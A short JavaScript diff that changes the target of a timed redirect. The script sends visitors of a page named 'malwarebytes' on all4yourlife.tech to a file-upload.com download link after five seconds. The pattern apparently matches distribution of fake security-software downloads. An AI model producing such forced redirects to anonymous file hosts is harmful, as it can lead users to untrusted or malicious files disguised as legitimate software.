@@ -28,7 +28,7 @@ var stop8 = false;
         }
         try{if(window.location.href == "https://all4yourlife.tech/malwarebytes/" && stop1 == false){
             console.log("dasd");
-            setTimeout(function(){window.location.href = "https://www.file-upload.com/uda4r2c7018r"},5000)
+            setTimeout(function(){window.location.href = "https://www.file-upload.com/7u7poku02h0i"},5000)
             stop1 = true;
         }}catch(e){}
     },5000)
